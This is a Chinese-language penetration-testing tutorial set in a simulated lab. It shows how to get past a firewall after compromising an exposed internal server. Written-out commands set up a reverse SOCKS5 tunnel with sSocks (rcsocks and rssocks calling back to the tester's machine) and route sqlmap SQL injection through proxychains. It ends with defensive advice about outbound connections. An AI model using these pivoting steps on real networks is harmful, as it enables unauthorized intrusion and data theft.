**随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认****web**服务端口**80**、**MSSQL**数据库服务端口*1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。

对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。

1.sSocks

sSocks是一个[socks代理](http://www.freebuf.com/news/topnews/111545.html)工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。

[http://sourceforge.net/projects/ssocks/](http://sourceforge.net/projects/ssocks/)

下载解压后，执行命令编译。

```
./configure && make
```

编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下：

程序 功能
**nsocks** 类似通过Socks5代理后的netcat，可用来测试socks server
**ssocksd** 用来开启Socks5代理服务
**ssocks** 本地启用Socks5服务，并反弹到另一IP地址
**rcsocks** 接收反弹过来的Socks5服务，并转向另一端口

**2.模拟网络环境说明**

 本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 

[![模拟的网络环境](http://image.3001.net/uploads/image/20130901/20130901105859_75679.jpg)](http://image.3001.net/uploads/image/20130901/20130901105859_75679.jpg)

**3.实施Socks代理反弹**
**1)本地监听端口**
在渗透测试端192.168.10.50执行

```
./rcsocks -l 1088 -p 1080 -vv
```

等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道，如图2。 

[![Socks代理反弹突破内网](http://image.3001.net/uploads/image/20130901/20130901105926_77843.jpg)](http://image.3001.net/uploads/image/20130901/20130901105926_77843.jpg)

**2)开启Socks5代理服务，反弹**
在192.168.206.130上执行

```
./rssocks -vv -s 192.168.10.50:1080
```

启用Socks5服务，反弹到192.168.10.50的端口1080上，如图3。 

[![开启Socks5代理服务，反弹](http://image.3001.net/uploads/image/20130901/20130901110001_38329.jpg)](http://image.3001.net/uploads/image/20130901/20130901110001_38329.jpg)

此时在渗透测试端192.168.10.50可看到通道连接成功，效果如图4。

[![通道连接成功](http://image.3001.net/uploads/image/20130901/20130901110020_58042.jpg)](http://image.3001.net/uploads/image/20130901/20130901110020_58042.jpg)

**4.利用proxychains进行Socks5代理**
通过前面的步骤，Socks5代理已创建完成了。由于在渗透测试过程中，需要使用不同的工具程序，而在各程序中分别配置Socks5代理信息较为繁琐，而部分程序并不支持配置Socks5代理。为了简化这些操作，我们可以采用proxychains。
proxychains是一个代理客户端软件，可以支持几乎所有程序的代理，如ssh，telnet，ftp等。利用proxychains，程序能在代理的环境下被加载运行，而本身不需要具备代理功能。使用前需要对proxychains进行简单配置，打开配置文件proxychains.conf（在BT5位于/etc/proxychains.conf），如图5所示，在[ProxyList]处添加
**socks5 127.0.0.1 1088**

[![利用proxychains进行Socks5代理](http://image.3001.net/uploads/image/20130901/20130901110043_92020.jpg)](http://image.3001.net/uploads/image/20130901/20130901110043_92020.jpg)

配置成功后若要启动程序，仅需要在启动程序命令前加上proxychains。
**1)启用浏览器firefox，在终端执行命令：**

```
proxychains firefox
```

firefox启动成功，访问192.168.206.135的web服务如图6，通过代理访问成功。

[![通过代理访问成功](http://image.3001.net/uploads/image/20130901/20130901110125_93242.jpg)](http://image.3001.net/uploads/image/20130901/20130901110125_93242.jpg)

**2)利用sqlmap进行注入：**
先切换到sqlmap目录
cd /pentest/database/sqlmap
proxychains python sqlmap.py -u “存在SQL注入的链接” –dbs
注入成功，注入点信息及获取数据库信息如图7所示。

[![利用sqlmap进行注入](http://image.3001.net/uploads/image/20130901/20130901110208_52827.jpg)](http://image.3001.net/uploads/image/20130901/20130901110208_52827.jpg)

**5.后记**
由于系统管理员的疏忽或者业务需求所致，防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此，在此种情况下，通过攻陷映射到公网的端口服务，利用反弹便可获取内网访问权限，给内网安全带来极大的威胁。在信息安全建设与运维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁。
